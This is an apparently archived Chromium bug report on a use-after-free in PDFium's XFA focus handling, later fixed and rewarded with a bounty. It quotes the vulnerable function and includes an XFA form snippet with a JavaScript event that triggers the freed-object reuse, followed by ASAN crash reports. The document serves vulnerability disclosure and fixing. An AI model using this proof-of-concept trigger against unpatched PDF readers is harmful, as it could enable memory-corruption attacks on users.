# Security: Use-after-free in CXFA_FFDocView::SetFocus

| Field | Value |
|-------|-------|
| **Issue ID** | [40096089](https://issues.chromium.org/issues/40096089) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | my...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2019-08-25 |
| **Bounty** | $5,000.00 |

## Description

Steps to reproduce the problem:
1. Compile the latest chromium with enabled XFA PDFium.
2. Open file test.pdf with chrome (PageHeap is enabled).


What is the expected behavior?

What went wrong?
CXFA_FFWidget object use-after-free in function CXFA_FFDocView::SetFocus

Did this work before? N/A 

Chrome version: Lasted  Channel: n/a
OS Version: Windows 10 
Flash Version:

The bug is in CXFA_FFDocView::SetFocus() function

bool CXFA_FFDocView::SetFocus(CXFA_FFWidget* pNewFocus) {
  CXFA_FFWidget* pOldFocus = m_pFocusWidget.Get();

  if (pOldFocus == pNewFocus)
    return false;

... 

  if (pNewFocus) {
    if (pNewFocus->GetLayoutItem()->TestStatusBits(XFA_WidgetStatus_Visible)) {
      if (!pNewFocus->IsLoaded())
        pNewFocus->LoadWidget();                // ==> can trigger JS function => delete |pOldFocus|
      if (!pNewFocus->OnSetFocus(pOldFocus))    // ==> use |pOldFocus| again!!!
        pNewFocus = nullptr;
    }
  }
  if (pNewFocus) {
    CXFA_Node* node = pNewFocus->GetNode();
    m_pFocusNode = node->IsWidgetReady() ? node : nullptr;
    m_pFocusWidget.Reset(pNewFocus);
  } else {
    m_pFocusNode = nullptr;
    m_pFocusWidget.Reset();
  }

  return true;
}

Function LoadWidget() can trigger to JS code by setting an 'change' event to field. Like in proof-of-concept file, 
i have a 'numericEdit' field like this

  <field name="field3" x="5mm" y="50mm">
    <ui>
      <numericEdit/>
    </ui>
    <event activity="initialize" name="event__initialize">
      <script contentType="application/x-javascript">
        field3.rawValue=1;
      </script>
    </event>
    <event activity="change">
      <script contentType="application/x-javascript">
        f1 = xfa.resolveNode("xfa.form..field1");
        xfa.host.setFocus(f1);
        f4 = xfa.resolveNode("xfa.form..field4");
        f4.instanceManager.addInstance(1);
        f4.instanceManager.removeInstance(0);
        xfa.host.openList(f1);
      </script>
    </event>
  </field>

JS code in 'change' event will be executed when function LoadWidget() is called and it'll free the object |pOldFocus|. 
After JS event handler, it backs to function CXFA_FFDocView::SetFocus(), the object |pOldFocus| will be used again in 
function call pNewFocus->OnSetFocus(pOldFocus) => use-after-free bug!

## Attachments

- [test.pdf](attachments/test.pdf) (application/pdf, 6.7 KB)
- [crash_log.txt](attachments/crash_log.txt) (text/plain, 27.6 KB)

## Timeline

### cl...@chromium.org (2019-08-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5180767973277696.

### mb...@chromium.org (2019-08-26)

[Empty comment from Monorail migration]

### mb...@chromium.org (2019-08-26)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>PDF]

### mb...@chromium.org (2019-08-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-08-26)

Automatically assigning owner based on suspected regression changelist https://pdfium.googlesource.com/pdfium/+/ac91f6b598f5e0373176e6e9b860c1e135fddf65 (Pass DPI as CFX_Size in XFA_DrawImage.).

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### cl...@chromium.org (2019-08-26)

Detailed Report: https://clusterfuzz.com/testcase?key=5180767973277696

Fuzzing Engine: libFuzzer
Fuzz Target: pdfium_xfa_fuzzer
Job Type: libfuzzer_chrome_asan
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000020778
Crash State:
  fxcrt::UnownedPtr<CXFA_Node>::Get
  CXFA_FFWidget::IsAncestorOf
  CXFA_FFWidget::OnSetFocus
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=libfuzzer_chrome_asan&range=555504:555559

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5180767973277696

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### mb...@chromium.org (2019-08-26)

Updating impact label since XFA isn't shipped.

### th...@chromium.org (2019-08-27)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-10-17)

Automatically adding ccs based on OWNERS file / target commit history.

If this is incorrect, please add the ClusterFuzz-Wrong label.

### my...@gmail.com (2020-01-06)

Hi, I've just noticed that on recent patch, you fixed this bug.
https://pdfium-review.googlesource.com/c/pdfium/+/64530
As I can see, the bug ID is far behind from this issue. May I ask if you can reward based on the knowledge I've found several months ago so we can close this issue?

### my...@gmail.com (2020-01-07)

@thestig: can you cc @tsepez to this issue? I believe that I reported this bug before he does.
Also, can you reward for this issue? It have been a while. I really appreciate it.

### my...@gmail.com (2020-01-08)

Assigning tsepez@ for assessment

### th...@chromium.org (2020-01-08)

re: https://crbug.com/chromium/997515#c11 - Done. Sorry I couldn't get to this in a more timely manner. I'll let whoever is handling the security rewards figure out who gets what.

### ts...@chromium.org (2020-01-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-01-09)

ClusterFuzz testcase 5180767973277696 is verified as fixed in https://clusterfuzz.com/revisions?job=libfuzzer_chrome_asan&range=729241:729242

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### cl...@chromium.org (2020-01-09)

Detailed Report: https://clusterfuzz.com/testcase?key=6381620672135168

Fuzzing Engine: libFuzzer
Fuzz Target: pdfium_xfa_fuzzer
Job Type: libfuzzer_chrome_asan
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60d0000ec6e8
Crash State:
  fxcrt::UnownedPtr<CXFA_Node>::Get
  CXFA_FFWidget::GetNode
  CXFA_FFWidget::IsAncestorOf
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=libfuzzer_chrome_asan&range=549285:549301
Fixed: https://clusterfuzz.com/revisions?job=libfuzzer_chrome_asan&range=729241:729242

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6381620672135168

See https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md for instructions on reproducing this bug locally.

### sh...@chromium.org (2020-01-11)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2020-01-11)

[Empty comment from Monorail migration]

### na...@google.com (2020-01-14)

[Empty comment from Monorail migration]

### na...@google.com (2020-01-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-01-23)

Congrats the Panel decided to reward $5,000 for this report!

### na...@google.com (2020-01-23)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-18)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-04-18)

This issue was migrated from crbug.com/chromium/997515?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1037981]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40096089)*
